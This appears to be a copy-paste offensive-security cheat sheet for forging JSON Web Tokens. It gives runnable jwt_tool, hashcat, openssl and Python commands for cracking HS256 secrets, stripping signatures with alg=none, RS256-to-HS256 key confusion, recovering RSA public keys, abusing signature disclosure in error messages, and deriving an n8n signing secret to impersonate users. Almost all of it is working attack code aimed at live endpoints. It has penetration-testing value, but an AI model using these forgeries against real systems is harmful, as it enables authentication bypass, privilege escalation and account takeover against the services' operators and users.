# Forge a JWT signature you already hold — Open WHEN: you have captured an HS256/RS256 JWT and need the exact crack/forge commands to get a tampered payload accepted

You hold a token and confirmed (or suspect) weak signature verification. Below are the runnable strings to crack the HS secret, strip the signature, or do RS256->HS256 key confusion. Concepts are in the body; this file is the copy-paste layer.

## Decode + inject claims/headers with jwt_tool
```bash
python3 jwt_tool.py <JWT>                                   # decode header+payload
python3 jwt_tool.py <JWT> -T                                # tamper interactively
python3 jwt_tool.py <JWT> -I -pc role -pv admin             # inject payload claim
python3 jwt_tool.py <JWT> -I -hc kid -hv testval            # inject header claim
python3 jwt_tool.py -M at -t "https://api.tgt/api/v1/user/<id>" -rh "Authorization: Bearer <JWT>"   # all-tests mode against a live endpoint
```

## HS256 secret crack (offline)
```bash
# jwt_tool dictionary crack
python3 jwt_tool.py <JWT> -C -d /path/wordlist.txt

# hashcat mode 16500 — put the full JWT on one line in jwt.txt
hashcat -a 0 -m 16500 jwt.txt wordlist.txt                          # dict
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r rules/best64.rule     # rule-based
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6 # mask brute

# brendan-rius/c-jwt-cracker for short alnum secrets
```
Known-weak secret wordlist: `wallarm/jwt-secrets` (3502 entries incl. `your_jwt_secret`, `secret`, `change_this_super_secret_random_string`). Try those first.

Once cracked, re-sign with the known secret:
```python
import jwt
jwt.encode({"sub":"1234567890","role":"admin","iat":1516239022}, "secret", algorithm="HS256")
```

## alg=none / null-signature (CVE-2015-9235, CVE-2020-28042)
Case variants to try (some libs only lowercase-compare): `none` `None` `NONE` `nOnE`.
```bash
python3 jwt_tool.py <JWT> -X a    # alg:none, signature stripped
python3 jwt_tool.py <JWT> -X n    # null-signature: keep HS256 header, send empty sig
```
Null-sig wire format = header.payload with a trailing dot and nothing after it:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```
Manual `none` forge (regenerate by hand if the lib refuses to emit `alg=none`):
```python
import jwt
decoded = jwt.decode(jwtToken, verify=False)
print(jwt.encode(decoded, key='', algorithm=None).decode())
```

## RS256 -> HS256 key confusion (CVE-2016-5431 / CVE-2016-10555)
Server expects RSA, receives HS256, and uses the RSA **public** key bytes as the HMAC secret. Get the public key first:
```bash
# from JWKS: /jwks.json or /.well-known/jwks.json  (import n/e in Burp JWT Editor -> PEM)
# from the TLS cert if the app reuses its web-server keypair:
openssl s_client -connect tgt:443 2>/dev/null </dev/null | openssl x509 -pubkey -noout > pubkey.pem
```
Forge with jwt_tool:
```bash
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
```
Forge with pyjwt (needs old `pip install pyjwt==0.4.3`; modern pyjwt raises `InvalidKeyError`):
```python
import jwt
public = open('public.pem').read()
print(jwt.encode({"data":"test","role":"admin"}, key=public, algorithm='HS256'))
```
Manual HMAC re-sign (when libs block asymmetric-as-HMAC). Header must already be edited to `alg:HS256`:
```bash
cat key.pem | xxd -p | tr -d '\n'          # public key -> ASCII hex (HMAC key)
echo -n "<b64header>.<b64payload>" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<PUBKEY_HEX>
# hex digest -> base64url, strip '=', append as the signature segment
python2 -c "import base64,binascii;print base64.urlsafe_b64encode(binascii.a2b_hex('<HEXSIG>')).replace('=','')"
```

## Recover the RSA public key from two signed JWTs
RS256/384/512 use PKCS#1 v1.5 — the public key is computable from two distinct message/signature pairs, then feed it into the confusion attack above.
```bash
docker run -it ttervoort/jws2pubkey "$(cat jws1.txt)" "$(cat jws2.txt)" | tee pubkey.jwk
```

## Disclosure-of-correct-signature (CVE-2019-7644)
Send a deliberately wrong signature; vulnerable verifiers (jwt-dotnet, Auth0-WCF) leak the expected one in the error:
```
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBn...
```
Copy the `Expected` value straight into the signature segment.

## ES256 same-nonce private-key recovery
If two ES256 JWTs were signed with the same ECDSA nonce, the private key is recoverable (SECP256k1 math, see asecuritysite ecd5). Diff the `r` values across captured tokens — identical `r` means reused nonce.

## Derive the secret from a config + DB leak (n8n chain, CVE-2026-21858)
With an arbitrary-file-read that exposes the app encryption key plus the user table, you can rebuild the signing secret without any password plaintext:
```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()
jwt_hash   = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token      = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
# drop into the session cookie (e.g. n8n-auth) to impersonate
```
